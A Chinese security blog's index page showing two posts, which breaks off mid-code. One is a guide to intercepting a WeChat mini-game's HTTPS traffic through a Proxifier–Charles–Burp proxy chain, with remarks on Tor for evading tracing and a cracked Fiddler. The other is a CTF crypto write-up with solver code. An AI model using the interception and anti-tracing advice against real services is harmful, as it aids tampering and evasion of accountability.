<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"c4ooc0.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.13.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="永怀谦卑与求知欲">
<meta property="og:type" content="website">
<meta property="og:title" content="c4ooc0个人博客">
<meta property="og:url" content="https://c4ooc0.github.io/index.html">
<meta property="og:site_name" content="c4ooc0个人博客">
<meta property="og:description" content="永怀谦卑与求知欲">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="c4ooc0">
<meta property="article:tag" content="安全 瞎折腾">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://c4ooc0.github.io/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>c4ooc0个人博客</title>
  






  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">c4ooc0个人博客</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">半吊子的安全工程师，ACG爱好者</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">c4ooc0</p>
  <div class="site-description" itemprop="description">永怀谦卑与求知欲</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">9</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/c4ooc0" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;c4ooc0" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://www.yuque.com/choocolate-yqwd/blog" title="语雀 → https:&#x2F;&#x2F;www.yuque.com&#x2F;choocolate-yqwd&#x2F;blog" rel="noopener" target="_blank">语雀</a>
      </span>
  </div>


  <div class="links-of-blogroll site-overview-item animated">
    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
      友友们
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="http://macshuo.com/" title="http:&#x2F;&#x2F;macshuo.com&#x2F;" rel="noopener" target="_blank">testLink</a>
        </li>
    </ul>
  </div>

        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://c4ooc0.github.io/2022/09/22/%E4%BB%8Epc%E7%AB%AF%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%AD%A6%E4%B9%A0%E4%BB%A3%E7%90%86%E9%93%BE%E5%92%8CCA%E8%AF%81%E4%B9%A6%20%E4%BB%A5%E7%BE%8A%E4%BA%86%E4%B8%AA%E7%BE%8A%E4%B8%BA%E4%BE%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="c4ooc0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="c4ooc0个人博客">
      <meta itemprop="description" content="永怀谦卑与求知欲">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | c4ooc0个人博客">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/09/22/%E4%BB%8Epc%E7%AB%AF%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%AD%A6%E4%B9%A0%E4%BB%A3%E7%90%86%E9%93%BE%E5%92%8CCA%E8%AF%81%E4%B9%A6%20%E4%BB%A5%E7%BE%8A%E4%BA%86%E4%B8%AA%E7%BE%8A%E4%B8%BA%E4%BE%8B/" class="post-title-link" itemprop="url">从pc端微信小程序抓包环境搭建学习代理链和CA证书 以羊了个羊为例</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-09-22 15:24:46" itemprop="dateCreated datePublished" datetime="2022-09-22T15:24:46+08:00">2022-09-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-11-10 16:09:54" itemprop="dateModified" datetime="2022-11-10T16:09:54+08:00">2022-11-10</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>2k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>7 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <blockquote>
<p>绝大多数安卓模拟器与 wsl 冲突，之前搭好的安卓模拟器抓包环境不能用，气死我了！！突然看到<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/woZUSKweln47mGZnt_JB2g">https://mp.weixin.qq.com/s/woZUSKweln47mGZnt_JB2g</a>，搭建 pc 端的程序抓包环境，遂尝试一二，并学习记录了其中的知识盲区。
又是从笔记搬到博客的屑
Proxifier 真的真的很好用</p>
</blockquote>
<h1 id="工具介绍"><a class="markdownIt-Anchor" href="#工具介绍"></a> 工具介绍</h1>
<h2 id="proxifier"><a class="markdownIt-Anchor" href="#proxifier"></a> Proxifier</h2>
<p>Proxifier 是一款代理客户端软件，可以让不支持代理服务器工作的程序变的可行。支持各种操作系统和各代理协议，它的运行模式可以指定端口，指定程序的特点。</p>
<p>我理解就是指定某个程序走特定的代理服务器。比如本次环境搭建就是让微信小程序的流量通过代理的方式经过 Charles，然后 Charles 的流量代理到 BP，所以 Proxifier 是本次环境搭建的核心，实际上直接使用 Proxifier+Burpsuite 也是可以的。
PS:wsl 会和 Proxifier 冲突，解决方法参考：<a target="_blank" rel="noopener" href="https://github.com/dyingsu/nolsp">https://github.com/dyingsu/nolsp</a></p>
<h2 id="charles"><a class="markdownIt-Anchor" href="#charles"></a> Charles</h2>
<p>Charles 是在 PC 端常用的网络封包截取工具，在做移动开发时，我们为了调试与服务器端的网络通讯协议，常常需要截取网络封包来分析。除了在做移动开发中调试端口外，Charles 也可以用于分析第三方应用的通讯协议。配合 Charles 的 SSL 功能，Charles 还可以分析 Https 协议。
Charles 主要的功能包括：</p>
<ul>
<li>截取 Http 和 Https 网络封包。</li>
<li>支持重发网络请求，方便后端调试。</li>
<li>支持修改网络请求参数。</li>
<li>支持网络请求的截获并动态修改。</li>
<li>支持模拟慢速网络。</li>
</ul>
<p>注意一点就是抓 HTTPS 的流量需要安装 Charles 证书到受信任的根证书颁发机构。</p>
<p>文章中提到反向代理，扫盲文章：</p>
<h2 id="burpsuite"><a class="markdownIt-Anchor" href="#burpsuite"></a> Burpsuite</h2>
<p>dddd</p>
<h2 id="fiddler"><a class="markdownIt-Anchor" href="#fiddler"></a> Fiddler</h2>
<p>还是 🐏 的攻略，这里使用 Fiddler 进行抓包，之前没接触过，看到 FiddlerScript 比较感兴趣，浅试了一下。
3.4.1 破解见附件
用法：</p>
<h1 id="代理链"><a class="markdownIt-Anchor" href="#代理链"></a> 代理链</h1>
<p>流量会从小程序会通过 Proxifier 走到 Charles 工具，然后 Charles 走代理到 Burpsuite，最后使用 Burpsuite 来进行修改和重放，其实就是走了一个代理链（多级转发代理），上手试一遍就基本会了。
不过在搜代理链时，看到更多的是逃避检测，tor，洋葱路由，暗网技术，瞬间来劲了。</p>
<h3 id="tor"><a class="markdownIt-Anchor" href="#tor"></a> Tor</h3>
<p>Tor 是什么？The Onion Router，洋葱路由，一个软件。Tor 是一个三重代理，Tor 客户端先与目录服务器通信获得全球活动中继节点信息，然后再随机选择三个节点组成电路(circuit)，用户流量跳跃这三个节点(hop)之后最终到达目标网站服务器，这样 Tor 网络中就有两种实体，分别是用户和中继节点。
当用户需要匿名访问网络时，首先访问目录服务器，得到全球的 Tor 中继节点的信息，包括 IP 地址、公钥、出口策略、带宽和在线时间等。然后再随机选择三个节点组成电路(circuit)，分别为入口节点、中间节点和出口节点。在构建电路时，用户和每一个中继节点协商共享的会话密钥，之后将层层加密的信息发送到电路中，每个中继节点经过一次解密后，将信息发给下一个节点。这样，中继节点中只有入口节点知道通信发起者的身份。中间节点知道通道中入口节点和出口节点的身份，但是不知道匿名通信发起者和接收者的身份。出口节点作为网关负责 Tor 网络和外部 Internet 网络的应用层连接，并充当加密的 Tor 网络传输流量和非加密的 Internet 传输流量之间的中继，知道匿名通信接收者的身份。在这种设计下，电路中没有任何一个节点知道完整的信息，因此实现了匿名通信。
更多细节可以参考：
单从逃避检测，防止溯源上来说，该文章简单介绍了如何利用 tor 来隐藏 vps 的 ip、
该文章介绍用公共代理（试过了，用不了，暂时没有解决方法）和 ProxyChains 实现匿名，随便搜的，质量一般，有空可以试一下。作用是在前期信息收集时可以更好的隐藏 ip，缺点肯定是比较慢吧，还有感觉用 tor 的话应该都是国外 ip，比较明显，不知道国内 tor 环境咋样。</p>
<h1 id="证书与-ca"><a class="markdownIt-Anchor" href="#证书与-ca"></a> 证书与 CA</h1>
<h2 id="证书"><a class="markdownIt-Anchor" href="#证书"></a> 证书</h2>
<p>众所周知，http 服务是很不安全的，所以需要在 http 基础上提供加密、认证、完整性保护的 https 服务。
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fjro2r2Z1E0FcJcouhCFbiFruCi4.png" alt="" />
图源：HTTP 图解 7.2.1</p>
<p>HTTPS 并非是应用层的一种新协议。只是 HTTP 通信接口部分用 SSL（SecureSocketLayer）和 TLS（TransportLayerSecurity）协议代替而已。通常，HTTP 直接和 TCP 通信。当使用 SSL 时，则演变成先和 SSL 通信，再由 SSL 和 TCP 通信了。简言之，所谓 HTTPS，其实就是身披 SSL 协议这层外壳的 HTTP。
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FnatvsZAWzeM4BA_AqxM_ga4EN3S.png" alt="" />
SSL 加密采用非对称加密体制（公钥加密）来交换会话密钥，为了确保公钥来源的可靠性（公钥没有被攻击者替换），这就需要一个可靠可信的 CA（数字证书认证机构，Certificate Authority）负责发放和管理数字证书，承担公钥体系中公钥的合法性检验的责任。
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FlVis-fQX5ZCu3uVAY25ygBsYTX7.png" alt="" />
服务器会将这份由数字证书认证机构颁发的公钥证书发送给客户端，以进行公开密钥加密方式通信。公钥证书也可叫做数字证书或直接称为证书。所以这里就需要一个可信的数字证书认证机构，通过 CA 的可信度来推得证书的可信度。
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FuZQKFe7VsBSuCe2K6yZecz2KKuR.png" alt="" /></p>
<h2 id="bp-的-https-交互过程"><a class="markdownIt-Anchor" href="#bp-的-https-交互过程"></a> BP 的 https 交互过程</h2>
<p>BurpSuite 的基本思路是伪装成目标 https 服务器（中间人攻击），让浏览器（client）相信 BurpSuite 就是目标站点。为了达成目标，BurpSuite 必须：</p>
<ul>
<li>生成一对公私钥，并将公钥和目标域名绑定并封装为证书；</li>
<li>让浏览器相信此证书，即通过证书验证。</li>
</ul>
<p>所以， BurpSuite 需要在操作系统添加一个根证书，这个根证书可以让浏览器信任所有 BurpSuite 颁发的证书。具体流程如下：</p>
<pre><code>Client                     			BurpSuite                            	 Server
|-----https(tcp 443) req------&gt; |
</code></pre>
<p>Generate an certificate1 boundwith the target domain
|&lt;------ -certificate1----------&gt;|
|&lt;-------SSL negotiation--------&gt;|
|&lt;-----security connection------&gt;|
| -------https(tcp 443) req----------&gt;|
|&lt;-------certificate2----------------&gt;|
|&lt;----------SSL connection--------&gt;|
|&lt;-------security connection------&gt;|
之后，BurpSuite 拥有了两套对称密钥，一套用于与 client 交互，另外一套与 server 交互，而在 BurpSuite 处可以获得 https 明文。</p>
<h2 id="windows-证书存储"><a class="markdownIt-Anchor" href="#windows-证书存储"></a> Windows 证书存储</h2>
<p><img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fq-_W6yTILAzRE0qD8Y140IffWVG.png" alt="" />
每个 windows 系统证书存储具有以下类型：</p>
<ul>
<li>本地计算机证书存储这种类型的证书存储是计算机的本地证书存储，并且对于计算机上的所有用户都是全局性的。 此证书存储位于注册表中 HKEY_LOCAL_MACHINE 根下。</li>
<li>当前用户证书存储此类型的证书存储区是计算机上用户帐户的本地证书。 此证书存储位于注册表中 HKEY_CURRENT_USER 根下。</li>
</ul>
<p>当前 用户/个人存储区之外 的所有当前用户证书存储都将继承本地计算机证书存储的内容。
Windows 的 PnP 管理器验证成功数字签名的条件：</p>
<ul>
<li>用于创建签名的签名证书由 CA 颁发。</li>
<li>CA 对应的根证书安装在 &quot; <strong>受信任的根证书颁发机构</strong>&quot; 证书存储中，&quot;受信任的根证书颁发机构&quot; 证书存储包含所有 Windows 信任的 ca 的根证书。</li>
</ul>
<p>所以一般抓 HTTPS 流量代理软件的证书需要安装到<code>受信任的根证书颁发机构</code>。
其他存储位置：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FliSX0VFSGNBfR6mCPIAfGiHXVvR.png" alt="" /></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://c4ooc0.github.io/2022/08/26/%E7%BD%91%E9%BC%8E%E6%9D%AF2022%20%E9%9D%92%E9%BE%99%E7%BB%84%20Crypto405%20WP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="c4ooc0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="c4ooc0个人博客">
      <meta itemprop="description" content="永怀谦卑与求知欲">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | c4ooc0个人博客">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/08/26/%E7%BD%91%E9%BC%8E%E6%9D%AF2022%20%E9%9D%92%E9%BE%99%E7%BB%84%20Crypto405%20WP/" class="post-title-link" itemprop="url">网鼎杯2022 青龙组 Crypto405 WP</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-08-26 17:42:54" itemprop="dateCreated datePublished" datetime="2022-08-26T17:42:54+08:00">2022-08-26</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-11-10 16:09:55" itemprop="dateModified" datetime="2022-11-10T16:09:55+08:00">2022-11-10</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>1.5k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>5 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <blockquote>
<p>我是菜鸡，只做出来密码学的题 1551</p>
</blockquote>
<p>分析源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="title function_ invoke__">getPrime</span>(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">k = [<span class="title function_ invoke__">randrange</span>(<span class="number">1</span>,p) <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="title function_ invoke__">len</span>(flag)):</span><br><span class="line">    grasshopper = flag[i]</span><br><span class="line">    <span class="keyword">for</span> j in <span class="title function_ invoke__">range</span>(<span class="number">5</span>):</span><br><span class="line">        k[j] = grasshopper = grasshopper * k[j] % p</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&#x27;Grasshopper#&#x27;</span>+<span class="title function_ invoke__">str</span>(i).<span class="title function_ invoke__">zfill</span>(<span class="number">2</span>)+<span class="string">&#x27;:&#x27;</span>+<span class="title function_ invoke__">hex</span>(grasshopper)[<span class="number">2</span>:].<span class="title function_ invoke__">zfill</span>(<span class="number">4</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>p 是一个未知 16bit 素数，k 是五个随机数组成的队列。进入到循环是五次模乘，输出该行最后一个结果。
如果将所有的 k 列表组成一个 41*5 的矩阵 K，那么最后的输出结果就是该矩阵的最后一列。根据 output.txt，可以获得最后一列的数据。从 output.txt 中获取数据并转成十进制整型数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;out.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        grass.append(<span class="built_in">int</span>(<span class="string">&quot;0x&quot;</span> + line.split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>].split()[<span class="number">0</span>].decode(), <span class="number">16</span>))</span><br></pre></td></tr></table></figure>
<p>然后根据<code>k[j] = grasshopper = grasshopper * k[j] % p</code>，可以推的 K[i][j]_K[i-1][j+1]=K[i][j+1] mod p
由此可以推的第四列数据：K[i][4] _ K[i-1][5] = K[i][5] mod p (i&gt;1)，已知 K[i-1][5]和 K[i][5] ，编写代码求得 k[i][4] i&gt;1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_ invoke__">findFactor</span>(before, after, p):</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (before + p * i) % after != <span class="number">0</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> (before + p * i) / after</span><br></pre></td></tr></table></figure>
<p>以此类推，可以求得第 1~4 列的数据，除了 K[0][0]<sub>K[0][3],K[1][0]</sub>K[1][2],K[2][0]~K[2][1],K[3][0]由于初始 k 列表未知不可获得。代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">k_box = []</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">	line = [<span class="number">0</span>] * <span class="number">5</span></span><br><span class="line">	line[<span class="number">4</span>] = grass[i]</span><br><span class="line">	k_box.append(line)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">41</span>):</span><br><span class="line">	k_box[i + <span class="number">1</span>][<span class="number">3</span>] = (findFactor(k_box[i + <span class="number">1</span>][<span class="number">4</span>], k_box[i][<span class="number">4</span>], p))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">	k_box[i + <span class="number">2</span>][<span class="number">2</span>] = (findFactor(k_box[i + <span class="number">2</span>][<span class="number">3</span>], k_box[i + <span class="number">1</span>][<span class="number">3</span>], p))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">	k_box[i + <span class="number">3</span>][<span class="number">1</span>] = (findFactor(k_box[i + <span class="number">3</span>][<span class="number">2</span>], k_box[i + <span class="number">2</span>][<span class="number">2</span>], p))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">	k_box[i + <span class="number">4</span>][<span class="number">0</span>] = (findFactor(k_box[i + <span class="number">4</span>][<span class="number">1</span>], k_box[i + <span class="number">3</span>][<span class="number">1</span>], p))</span><br></pre></td></tr></table></figure>
<p>再次回顾<code>K[j] = grasshopper = grasshopper * K[j] % p</code>，flag[i]* K[i-1][0] % p = K[i][0]，所以由 K[i-1][0]和 K[i][0]已经求得，即可推出 flag[i],i&gt;4。不过因为 flag 格式已知，前五位是<code>flag&#123;</code>。代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>, <span class="number">41</span>):</span><br><span class="line">	res.append(<span class="built_in">int</span>(findFactor(k_box[i + <span class="number">1</span>][<span class="number">0</span>], k_box[i][<span class="number">0</span>], p)))</span><br></pre></td></tr></table></figure>
<p>还有最后一个问题，p 未知，直接生成比 K 矩阵最后一列所有数据都大（58767）的 16 位素数列表：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import math</span><br><span class="line"></span><br><span class="line">primes = []</span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">58769</span>, <span class="number">2</span> ** <span class="number">16</span>):</span><br><span class="line">    primes.<span class="title function_ invoke__">append</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">58769</span>, <span class="number">2</span> ** <span class="number">16</span>):</span><br><span class="line">    j = <span class="number">2</span></span><br><span class="line">    jud = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j in <span class="title function_ invoke__">range</span>(<span class="number">2</span>, <span class="title function_ invoke__">round</span>(math.<span class="title function_ invoke__">sqrt</span>(i)) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> i % j != <span class="number">0</span>:</span><br><span class="line">            j = j + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            jud = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> jud == <span class="number">0</span>:</span><br><span class="line">        primes.<span class="title function_ invoke__">remove</span>(i)</span><br></pre></td></tr></table></figure>
<p>遍历解密，如果成功解密，即找到素数 p，解密结果即 flag。
全部代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span 